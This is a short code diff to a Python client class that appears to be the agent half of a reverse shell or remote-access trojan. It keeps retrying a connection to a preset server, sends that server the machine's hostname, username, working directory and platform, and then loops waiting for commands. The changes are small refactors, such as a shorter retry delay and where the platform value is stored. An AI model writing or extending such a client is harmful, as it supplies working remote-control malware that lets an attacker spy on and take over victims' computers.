@@ -22,7 +22,7 @@ class Client:
 
         while self.socket.connect_ex(self.socket_addr) != 0:
             print(f'{Fore.LIGHTGREEN_EX}[+] {Fore.YELLOW}Waiting for connection')
-            time.sleep(2)
+            time.sleep(1)
             print(f'{Fore.RED}[-] Connection refused')
 
         print(f'{Fore.LIGHTGREEN_EX}[+] Connected to {self.socket_addr[0]}:{self.socket_addr[1]}')
@@ -30,18 +30,16 @@ class Client:
         self.buffer_size: int = 1024 * 128
         self.separator: str = '<||>'
 
-        self.username = getpass.getuser()
-
         os.chdir('C:\\')
 
+        self.platform_type: str = sys.platform.lower()
+        self.username = getpass.getuser()
         self.working_directory = os.getcwd()
 
         self.socket.send(self.working_directory.encode())
         self.socket.send(socket.gethostname().encode())
         self.socket.send(self.username.encode())
-
-        platform_type: str = sys.platform.lower()
-        self.socket.send('Windows'.encode() if platform_type == 'win32' else platform_type.encode())
+        self.socket.send('Windows'.encode() if self.platform_type == 'win32' else self.platform_type.encode())
 
         while True:
             command = self.socket.recv(self.buffer_size).decode()
